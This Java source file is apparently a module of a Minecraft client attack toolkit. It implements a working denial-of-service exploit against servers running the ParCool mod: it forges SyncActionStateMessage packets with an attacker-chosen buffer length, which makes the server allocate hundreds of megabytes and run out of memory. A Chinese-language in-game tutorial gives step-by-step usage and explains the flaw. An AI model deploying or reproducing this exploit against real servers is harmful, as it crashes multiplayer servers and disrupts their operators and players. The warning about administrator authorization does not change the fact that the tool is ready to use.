package com.redblue.red.modules.parcool;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * PCOOL-03: OOM DoS via unbounded heap allocation in SyncActionStateMessage.decode().
 *
 * The decode() method reads bufferLength as readInt(), then does:
 *   new byte[bufferLength]
 * with NO size check before allocation. The Decoder's 1024-byte limit
 * is only checked AFTER the full buffer is already allocated and read.
 *
 * Wire format:
 *   writeByte(15)              -- discriminator (SyncActionStateMessage)
 *   writeLong(uuidMost)
 *   writeLong(uuidLeast)
 *   writeInt(bufferLength)     -- attacker-controlled, triggers allocation
 *   // Don't write actual bytes -- server OOMs on allocation or readBytes
 */
public class PCOOL03_DoS implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("parcool", "message");
    private static final int IDX_SYNC_ACTION_STATE = 15;

    private final List<ConfigParam> params = List.of(
            ConfigParam.ofBool("enabled", "启用", false),
            ConfigParam.ofBool("confirm_danger", "!! 确认: 可能导致服务器崩溃", false),
            ConfigParam.ofInt("buffer_size", "伪造缓冲区大小",
                    100000000, 1000000, 2000000000),
            ConfigParam.ofInt("packet_count", "发包数量", 1, 1, 10)
    );

    @Override public String id() { return "pcool03_dos"; }
    @Override public String name() { return "内存溢出攻击"; }
    @Override public String description() { return "伪造超大 bufferLength 导致服务器 OOM"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
                + "1. 勾选「确认」开关\n"
                + "2. 点击「执行」发送攻击包\n"
                + "3. 这是一次性攻击，不需要 tick 循环\n\n"
                + "[参数说明]\n"
                + "伪造缓冲区大小：decode() 中 new byte[size] 的 size 值\n"
                + "  100000000 = ~100MB，足以造成严重内存压力\n"
                + "发包数量：同时发送的包数量\n\n"
                + "[原理]\n"
                + "SyncActionStateMessage.decode() 执行:\n"
                + "  int size = buf.readInt();    // 攻击者控制\n"
                + "  msg.buffer = new byte[size]; // 无上限分配\n"
                + "Decoder 的 1024 字节检查在 getItem() 中，\n"
                + "但 decode() 的分配发生在 getItem() 之前\n\n"
                + "[注意事项]\n"
                + "!! 这是破坏性攻击，可能导致服务器崩溃\n"
                + "仅用于安全测试，请确保有服务器管理员授权";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("parcool");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;

        boolean confirmed = getParam("confirm_danger")
                .map(ConfigParam::getBool).orElse(false);
        if (!confirmed) return;

        int bufferSize = getParam("buffer_size")
                .map(ConfigParam::getInt).orElse(100000000);
        int count = getParam("packet_count")
                .map(ConfigParam::getInt).orElse(1);

        for (int i = 0; i < count; i++) {
            PacketForge.send(CHANNEL, buf -> {
                buf.writeByte(IDX_SYNC_ACTION_STATE);
                buf.writeLong(mc.player.getUUID().getMostSignificantBits());
                buf.writeLong(mc.player.getUUID().getLeastSignificantBits());
                buf.writeInt(bufferSize);
                // No actual bytes written -- server will attempt
                // new byte[bufferSize] then fail on readBytes or OOM
            });
        }
    }
}
